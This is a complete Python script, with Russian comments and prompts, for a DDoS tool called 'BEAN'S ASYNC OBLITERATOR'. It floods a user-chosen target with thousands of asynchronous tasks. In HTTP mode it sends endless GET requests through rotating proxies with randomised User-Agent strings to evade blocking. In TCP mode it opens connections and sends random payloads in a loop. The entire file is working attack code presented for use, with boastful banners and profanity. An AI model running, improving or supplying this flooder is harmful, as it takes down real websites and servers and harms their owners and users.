import asyncio
import aiohttp
import random
import os
import sys
from tkinter import Tk, filedialog
from urllib.parse import urlparse

# Генератор рандомных User-Agent'ов
def generate_ua():
    versions = [
        f"{random.randint(100, 120)}.0.{random.randint(1000, 5000)}.{random.randint(10, 150)}",
        f"{random.randint(90, 100)}.0.{random.randint(1000, 4000)}"
    ]
    platforms = [
        "(Windows NT 10.0; Win64; x64)",
        "(Macintosh; Intel Mac OS X 10_15_7)",
        "(X11; Linux x86_64)",
        "(iPhone; CPU iPhone OS 17_2 like Mac OS X)"
    ]
    chrome = f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(versions)} Safari/537.36"
    return f"Mozilla/5.0 {random.choice(platforms)} {chrome}"

# Загрузка прокси из локального файла
def load_proxies_from_file(file_path):
    if not os.path.exists(file_path):
        return []
    with open(file_path, "r") as f:
        return [line.strip() for line in f if ":" in line]

# Асинхронная загрузка прокси по URL
async def load_proxies_from_url(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    return [line.strip() for line in text.splitlines() if ":" in line]
                else:
                    print(f"[!] Ошибка загрузки по URL: статус {resp.status}")
                    return []
    except Exception as e:
        print(f"[!] Не удалось загрузить прокси по URL: {e}")
        return []

# Задача HTTP-флуда
async def http_attack_task(target_url, proxies):
    # proxies - список строк (может быть пустым или с одним элементом)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            proxy = random.choice(proxies) if proxies else None
            proxy_url = f"http://{proxy}" if proxy and not proxy.startswith(('http://', 'https://', 'socks5://')) else proxy
            headers = {'User-Agent': generate_ua(), 'Connection': 'keep-alive'}
            try:
                async with session.get(target_url, headers=headers, proxy=proxy_url, timeout=3) as resp:
                    print(f"[HTTP-HIT] {proxy or 'LOCAL'} -> {target_url} | Code: {resp.status}")
            except Exception:
                pass  # игнорируем ошибки для скорости

# Задача TCP-флуда
async def tcp_attack_task(ip, port):
    while True:
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
            payload = random._urandom(2048)
            writer.write(payload)
            await writer.drain()
            print(f"[TCP-STRIKE] Connection established to {ip}:{port}")
            await asyncio.sleep(0.1)
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    ==================================================
       BEAN'S ASYNC OBLITERATOR v3.0 (PROXY + URL)
       Статус: УНИЧТОЖЕНИЕ ЧЕРЕЗ СВОЙ СЕРВЕР
    ==================================================
    """)

    target = input("Куда бьём? (URL для HTTP или IP для TCP): ").strip()
    mode = input("Режим (1 - HTTP ASYNC, 2 - TCP FLOOD): ")

    proxies = []  # список прокси (пустой = без прокси)

    if mode == "1":
        print("\n--- Настройка прокси для HTTP ---")
        proxy_type = input("Тип прокси: 0 - без прокси, 1 - единый прокси-сервер, 2 - список прокси: ").strip()

        if proxy_type == "1":
            # Единый прокси
            single_proxy = input("Введите адрес прокси (например, http://1.2.3.4:8080 или socks5://...): ").strip()
            if single_proxy:
                proxies = [single_proxy]
                print(f"[+] Будет использован единый прокси: {single_proxy}")
            else:
                print("[!] Прокси не задан, работаем без прокси.")

        elif proxy_type == "2":
            # Список прокси
            src = input("Источник списка: 1 - локальный файл, 2 - прямая ссылка (URL): ").strip()
            if src == "1":
                root = Tk()
                root.withdraw()
                file_path = filedialog.askopenfilename(
                    title="Выберите файл с прокси (формат ip:port)",
                    filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
                )
                root.destroy()
                if file_path:
                    proxies = load_proxies_from_file(file_path)
                    print(f"[+] Загружено {len(proxies)} прокси из файла.")
                else:
                    print("[!] Файл не выбран. Работаем без прокси.")
            elif src == "2":
                url = input("Введите прямую ссылку на текстовый файл с прокси: ").strip()
                if url:
                    proxies = await load_proxies_from_url(url)
                    print(f"[+] Загружено {len(proxies)} прокси по URL.")
                else:
                    print("[!] URL не введён. Работаем без прокси.")
            else:
                print("[!] Неверный выбор. Работаем без прокси.")
        # else: proxy_type == "0" или другой – остаёмся без прокси

    power = int(input("Количество асинхронных задач (пробуй 1000-5000): "))

    tasks = []
    if mode == "1":
        print(f"[!!!] Запуск HTTP Армагеддона на {target}...")
        for _ in range(power):
            tasks.append(http_attack_task(target, proxies))
    else:
        port = int(input("Порт: "))
        print(f"[!!!] Запуск TCP Аннигиляции на {target}:{port}...")
        for _ in range(power):
            tasks.append(tcp_attack_task(target, port))

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Бин уходит в офлайн. Всё, пиздец атаке.")
        sys.exit()
